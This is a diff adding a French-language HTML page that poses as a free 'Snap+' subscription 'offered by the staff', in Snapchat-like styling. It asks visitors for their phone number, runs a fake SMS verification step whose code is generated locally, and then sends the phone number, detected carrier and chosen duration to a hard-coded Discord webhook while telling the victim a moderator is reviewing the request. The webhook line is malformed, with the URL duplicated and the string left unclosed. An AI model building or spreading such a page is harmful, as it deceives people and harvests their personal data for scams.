@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snap+ | Abonnement</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+    body { background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+    .card { background: #111; border: 1px solid #FFFC00; border-radius: 20px; padding: 30px 24px; max-width: 420px; width: 100%; }
+    .logo { text-align: center; margin-bottom: 24px; }
+    .logo span { font-size: 28px; font-weight: 800; color: #FFFC00; }
+    .logo p { font-size: 13px; color: #aaa; margin-top: 4px; }
+
+    label { font-size: 13px; color: #aaa; margin-bottom: 6px; display: block; }
+    input, select { width: 100%; padding: 12px 14px; border-radius: 10px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 14px; margin-bottom: 16px; outline: none; transition: border 0.2s; }
+    input:focus, select:focus { border-color: #FFFC00; }
+
+    .operateur-tag { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 16px; }
+    .orange { background: #ff6600; color: #fff; }
+    .sfr { background: #cc0000; color: #fff; }
+    .bouygues { background: #0066cc; color: #fff; }
+    .free { background: #333; color: #fff; }
+    .invalide { background: #444; color: #aaa; }
+    .hidden { display: none; }
+
+    .duree { display: flex; gap: 10px; margin-bottom: 16px; }
+    .duree-btn { flex: 1; padding: 12px; border-radius: 10px; border: 1px solid #333; background: #1a1a1a; color: #aaa; font-size: 14px; cursor: pointer; text-align: center; transition: all 0.2s; }
+    .duree-btn.active { border-color: #FFFC00; color: #FFFC00; background: #1f1f00; }
+
+    .prix { text-align: center; font-size: 22px; font-weight: 700; color: #FFFC00; margin-bottom: 20px; }
+    .prix span { font-size: 13px; color: #aaa; font-weight: 400; }
+
+    .code-section { background: #1a1a1a; border-radius: 12px; padding: 16px; margin-bottom: 16px; border: 1px solid #333; }
+    .code-section p { font-size: 13px; color: #aaa; margin-bottom: 10px; }
+    .code-input { display: flex; gap: 8px; }
+    .code-input input { margin-bottom: 0; letter-spacing: 6px; font-size: 18px; font-weight: 700; text-align: center; }
+    .code-input button { padding: 0 14px; border-radius: 10px; border: none; background: #FFFC00; color: #000; font-weight: 700; cursor: pointer; font-size: 14px; white-space: nowrap; }
+
+    .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #FFFC00; color: #000; font-weight: 800; font-size: 16px; cursor: pointer; transition: opacity 0.2s; margin-top: 4px; }
+    .btn:hover { opacity: 0.85; }
+    .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+    .status { text-align: center; font-size: 13px; color: #aaa; margin-top: 16px; padding: 12px; background: #1a1a1a; border-radius: 10px; border: 1px solid #333; }
+    .status.pending { border-color: #FFFC00; color: #FFFC00; }
+    .status.success { border-color: #00cc66; color: #00cc66; }
+
+    .steps { display: flex; justify-content: space-between; margin-bottom: 28px; }
+    .step { text-align: center; flex: 1; }
+    .step-num { width: 28px; height: 28px; border-radius: 50%; background: #333; color: #aaa; font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; margin: 0 auto 6px; }
+    .step.active .step-num { background: #FFFC00; color: #000; }
+    .step p { font-size: 11px; color: #555; }
+    .step.active p { color: #aaa; }
+    .step-line { flex: 1; height: 1px; background: #333; margin-top: 14px; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <span>⭐ Snap+</span>
+    <p>Abonnement offert par le staff</p>
+  </div>
+
+  <!-- Steps -->
+  <div class="steps">
+    <div class="step active" id="step1-indicator">
+      <div class="step-num">1</div>
+      <p>Numéro</p>
+    </div>
+    <div class="step-line"></div>
+    <div class="step" id="step2-indicator">
+      <div class="step-num">2</div>
+      <p>Durée</p>
+    </div>
+    <div class="step-line"></div>
+    <div class="step" id="step3-indicator">
+      <div class="step-num">3</div>
+      <p>Vérif</p>
+    </div>
+  </div>
+
+  <!-- ÉTAPE 1 : numéro -->
+  <div id="step1">
+    <label>Ton numéro de téléphone</label>
+    <input type="tel" id="phone" placeholder="06 00 00 00 00" maxlength="14" oninput="formatPhone(this)" />
+    <div id="operateur-display" class="hidden"></div>
+    <button class="btn" id="btn-step1" onclick="goStep2()" disabled>Continuer</button>
+  </div>
+
+  <!-- ÉTAPE 2 : durée -->
+  <div id="step2" class="hidden">
+    <label>Choisir la durée</label>
+    <div class="duree">
+      <div class="duree-btn" onclick="selectDuree(this, 3)">3 mois</div>
+      <div class="duree-btn" onclick="selectDuree(this, 6)">6 mois</div>
+      <div class="duree-btn" onclick="selectDuree(this, 12)">12 mois</div>
+    </div>
+    <div class="prix hidden" id="prix-display"></div>
+    <button class="btn" id="btn-step2" onclick="goStep3()" disabled>Continuer</button>
+  </div>
+
+  <!-- ÉTAPE 3 : code + validation -->
+  <div id="step3" class="hidden">
+    <div class="code-section">
+      <p>🔐 Un code de vérification t'a été envoyé par SMS</p>
+      <div class="code-input">
+        <input type="text" id="code-input" placeholder="_ _ _ _" maxlength="4" oninput="checkCode(this)" />
+        <button onclick="sendCode()">Renvoyer</button>
+      </div>
+    </div>
+    <button class="btn" id="btn-valider" onclick="validerCommande()" disabled>Valider ma commande</button>
+    <div class="status hidden" id="status-msg"></div>
+  </div>
+</div>
+
+<script>
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1540556186368221235/YMqGHtmaKMlk52PPh5IeaXC3A2WHiNfjOkxUSjI50QCwvpadk2sVnBO1c8HylAS8iYWv;
+  const PRIX = { 3: "Gratuit", 6: "Gratuit", 12: "Gratuit" };
+
+  let selectedPhone = "";
+  let selectedOperateur = "";
+  let selectedDuree = 0;
+  let generatedCode = "";
+
+  function formatPhone(input) {
+    let v = input.value.replace(/\D/g, "").substring(0, 10);
+    input.value = v.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
+    detectOperateur(v);
+  }
+
+  function detectOperateur(num) {
+    const display = document.getElementById("operateur-display");
+    const btn = document.getElementById("btn-step1");
+    if (num.length < 10) {
+      display.className = "operateur-tag hidden";
+      btn.disabled = true;
+      return;
+    }
+    const prefix = num.substring(0, 4);
+    let op = "", cls = "";
+
+    const orange = ["0600","0601","0602","0603","0604","0605","0606","0607","0608","0609","0700","0701","0702","0703","0704","0705","0706","0707","0708","0709"];
+    const sfr = ["0610","0611","0612","0613","0614","0615","0616","0617","0618","0619","0710","0711","0712","0713","0714","0715","0716","0717","0718","0719"];
+    const bouygues = ["0620","0621","0622","0623","0624","0625","0626","0627","0628","0629","0720","0721","0722","0723","0724","0725","0726","0727","0728","0729"];
+    const free = ["0630","0631","0632","0633","0634","0635","0636","0637","0638","0639","0740","0741","0742","0743","0744","0745","0746","0747","0748","0749","0750","0751","0752","0753","0754","0755","0756","0757","0758","0759","0760","0761","0762","0763","0764","0765","0766","0767","0768","0769"];
+
+    if (orange.includes(prefix)) { op = "Orange"; cls = "orange"; }
+    else if (sfr.includes(prefix)) { op = "SFR"; cls = "sfr"; }
+    else if (bouygues.includes(prefix)) { op = "Bouygues"; cls = "bouygues"; }
+    else if (free.includes(prefix)) { op = "Free"; cls = "free"; }
+    else { op = "Opérateur non reconnu"; cls = "invalide"; }
+
+    display.textContent = "📡 " + op;
+    display.className = "operateur-tag " + cls;
+    selectedPhone = num;
+    selectedOperateur = op;
+
+    if (cls !== "invalide") { btn.disabled = false; }
+    else { btn.disabled = true; }
+  }
+
+  function goStep2() {
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+    document.getElementById("step2-indicator").classList.add("active");
+  }
+
+  function selectDuree(el, mois) {
+    document.querySelectorAll(".duree-btn").forEach(b => b.classList.remove("active"));
+    el.classList.add("active");
+    selectedDuree = mois;
+    const p = document.getElementById("prix-display");
+    p.textContent = mois + " mois — " + PRIX[mois];
+    p.classList.remove("hidden");
+    document.getElementById("btn-step2").disabled = false;
+  }
+
+  function goStep3() {
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("step3").classList.remove("hidden");
+    document.getElementById("step3-indicator").classList.add("active");
+    sendCode();
+  }
+
+  function sendCode() {
+    generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
+    console.log("Code généré (debug):", generatedCode); // à retirer en prod
+    // ici tu peux brancher une vraie API SMS si tu veux
+  }
+
+  function checkCode(input) {
+    document.getElementById("btn-valider").disabled = input.value.length < 4;
+  }
+
+  async function validerCommande() {
+    const code = document.getElementById("code-input").value;
+    if (code !== generatedCode) {
+      alert("Code incorrect !");
+      return;
+    }
+
+    const btn = document.getElementById("btn-valider");
+    btn.disabled = true;
+    btn.textContent = "Envoi en cours...";
+
+    const status = document.getElementById("status-msg");
+    status.classList.remove("hidden");
+    status.className = "status pending";
+    status.textContent = "⏳ Un modérateur vérifie ta demande...";
+
+    await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: null,
+        embeds: [{
+          title: "⭐ Nouvelle commande Snap+",
+          color: 0xFFFC00,
+          fields: [
+            { name: "📱 Numéro", value: selectedPhone, inline: true },
+            { name: "📡 Opérateur", value: selectedOperateur, inline: true },
+            { name: "📅 Durée", value: selectedDuree + " mois", inline: true },
+          ],
+          footer: { text: "Snap+ Staff Panel" },
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+
+    setTimeout(() => {
+      status.className = "status success";
+      status.textContent = "✅ Demande envoyée ! Le staff te contacte bientôt.";
+      btn.textContent = "Commande envoyée";
+    }, 2000);
+  }
+</script>
+</body>
+</html>
